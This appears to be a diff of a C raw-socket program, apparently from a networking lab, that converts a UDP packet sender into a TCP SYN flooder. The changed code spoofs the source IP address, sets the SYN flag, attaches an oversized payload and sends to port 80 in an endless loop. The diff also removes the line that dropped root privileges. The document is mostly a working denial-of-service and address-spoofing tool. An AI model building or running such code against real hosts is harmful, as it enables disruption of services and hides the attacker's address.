@@ -8,7 +8,6 @@
 #include <netinet/ip.h>	//Provides declarations for ip header
 #include <arpa/inet.h> // inet_addr
 #include <unistd.h> // sleep()
-#include <linux/udp.h>
 
 /* 96 bit (12 bytes) pseudo header needed for tcp header checksum calculation */
 struct pseudo_header {
@@ -16,7 +15,7 @@ struct pseudo_header {
 	u_int32_t dest_address;
 	u_int8_t placeholder;
 	u_int8_t protocol;
-	u_int16_t udp_length;
+	u_int16_t tcp_length;
 };
 
 
@@ -46,15 +45,13 @@ unsigned short csum(unsigned short *ptr,int nbytes)  {
 
 int main (void) {
 	//Create a raw socket
-	int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);
+	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
 	
 	if(s == -1) {
 		//socket creation failed, may be because of non-root privileges
 		perror("Failed to create socket");
 		exit(1);
 	}
-
-	setuid(getuid()); //remove root properties
 	
 	//Datagram to represent the packet
 	char datagram[4096] , source_ip[32] , *data , *pseudogram;
@@ -67,29 +64,29 @@ int main (void) {
     /*  */
 	
 	//TCP header
-    struct udphdr * udph = (struct udphdr *) (datagram + sizeof(struct ip));
+	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
 	struct sockaddr_in sin;
 	struct pseudo_header psh;
 	
 	//Data part
-	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
-	strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
+	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
+	strcpy(data , "RSTUVEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWX");
 	
 	//some address resolution
-	strcpy(source_ip , "192.168.15.4");
+	strcpy(source_ip , "192.168.15.99");//"4.3.2.1"); //"192.168.15.4");
 	sin.sin_family = AF_INET;
-	sin.sin_port = htons(7777);
-	sin.sin_addr.s_addr = inet_addr ("4.3.2.1");//("192.168.15.4");//("1.2.3.4");
+	sin.sin_port = htons(80);
+	sin.sin_addr.s_addr = inet_addr ("192.168.15.98");//("1.2.3.4");
 	
 	//Fill in the IP Header
 	iph->ihl = 5; //5*32 = minimo
 	iph->version = 4; //sempre = 4
 	iph->tos = 0; //prioridade (quality of service)
-	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data); //medido em bytes max 65535 /*default max: 576*/
+	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data); //medido em bytes max 65535 /*default max: 576*/
 	iph->id = htonl (54321);	//Id of this packet (16bits) 
 	iph->frag_off = 0; //[FLAGS<3>][FRAGMENT_OFFSET<13>]->posicao do fragmento no datagrama
 	iph->ttl = 255;
-	iph->protocol = IPPROTO_UDP;
+	iph->protocol = IPPROTO_TCP;
 	iph->check = 0;		//Set to 0 before calculating checksum
 	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
 	iph->daddr = sin.sin_addr.s_addr;
@@ -97,29 +94,36 @@ int main (void) {
 	//Ip checksum
 	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 	
-	//UDP Header
-    udph->source = htons(8888);
-    udph->dest = htons(7777);
-    udph->len = htons(sizeof(struct udphdr) + strlen(data));
-
-    //UDP Checksum
-    udph->check = 0;
-
+	//TCP Header
+	tcph->source = htons (1234);
+	tcph->dest = htons (80);
+	tcph->seq = 0;
+	tcph->ack_seq = 0;
+	tcph->doff = 5;	//tcp header size
+	tcph->fin=0;
+	tcph->syn=1;
+	tcph->rst=0;
+	tcph->psh=0;
+	tcph->ack=0;
+	tcph->urg=0;
+	tcph->window = htons (5840);	/* maximum allowed window size */
+	tcph->check = 0;	//leave checksum 0 now, filled later by pseudo header
+	tcph->urg_ptr = 0;
 	
-	//Now the TCP checksum   ---- pseudoheader
+	//Now the TCP checksum
 	psh.source_address = inet_addr( source_ip );
 	psh.dest_address = sin.sin_addr.s_addr;
 	psh.placeholder = 0;
-	psh.protocol = IPPROTO_UDP;
-	psh.udp_length = htons(sizeof(struct udphdr) + strlen(data) );
+	psh.protocol = IPPROTO_TCP;
+	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
 	
-	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
+	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
 	pseudogram = (char*) malloc(psize);
 	
 	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
-	memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + strlen(data));
+	memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
 	
-	udph->check = csum( (unsigned short*) pseudogram , psize);
+	tcph->check = csum( (unsigned short*) pseudogram , psize);
 	
 	//IP_HDRINCL to tell the kernel that headers are included in the packet
 	int one = 1;
@@ -134,7 +138,7 @@ int main (void) {
 	while (1) {
 		//Send the packet
 		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
-			perror("sendto failed");
+			perror("sendto failed"); //message too long
 		}
 		//Data send successfully
 		else {
